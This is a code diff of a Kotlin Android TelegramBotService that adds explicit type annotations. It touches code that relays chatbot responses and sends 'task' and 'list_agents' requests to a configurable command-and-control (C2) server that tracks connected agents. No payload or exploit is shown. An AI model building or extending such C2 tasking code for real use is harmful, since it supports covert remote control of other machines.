@@ -209,11 +209,11 @@ class TelegramBotService(private val context: Context) {
                     val responseBody = response.body?.string()
                     if (response.isSuccessful && responseBody != null) {
                         try {
-                            val json = gson.fromJson(responseBody, Map::class.java)
-                            val choices = json["choices"] as? List<*> ?: emptyList()
+                            val json: Map<String, Any> = gson.fromJson(responseBody, Map::class.java)
+                            val choices = json["choices"] as? List<Any> ?: emptyList()
                             if (choices.isNotEmpty()) {
-                                val firstChoice = choices[0] as? Map<*, *> ?: emptyMap()
-                                val message = firstChoice["message"] as? Map<*, *> ?: emptyMap()
+                                val firstChoice = choices[0] as? Map<String, Any> ?: emptyMap()
+                                val message = firstChoice["message"] as? Map<String, Any> ?: emptyMap()
                                 val content = message["content"] as? String ?: "No response"
                                 sendMessage(chatId, "🤖 *Nemotron 3 Ultra 550B:*\n\n$content")
                             } else {
@@ -264,7 +264,7 @@ class TelegramBotService(private val context: Context) {
 
         // Also try C2 if configured (non-blocking)
         val c2Url = getC2Url()
-        val payload = mapOf(
+        val payload = mapOf<String, Any>(
             "action" to "task",
             "capability" to capability,
             "args" to gson.toJson(args),
@@ -297,7 +297,7 @@ class TelegramBotService(private val context: Context) {
 
     private fun sendStatus(chatId: Long) {
         val c2Url = getC2Url()
-        val payload = mapOf("action" to "list_agents")
+        val payload = mapOf<String, String>("action" to "list_agents")
         sendC2Request(c2Url, "/api/agents", payload) { resp ->
             sendMessage(chatId, "📊 *Agents Status:*\n$resp")
         } ?: run {
@@ -307,7 +307,7 @@ class TelegramBotService(private val context: Context) {
 
     private fun sendAgentsList(chatId: Long) {
         val c2Url = getC2Url()
-        val payload = mapOf("action" to "list_agents")
+        val payload = mapOf<String, String>("action" to "list_agents")
         sendC2Request(c2Url, "/api/agents", payload) { resp ->
             sendMessage(chatId, "🤖 *Connected Agents:*\n$resp")
         } ?: run {
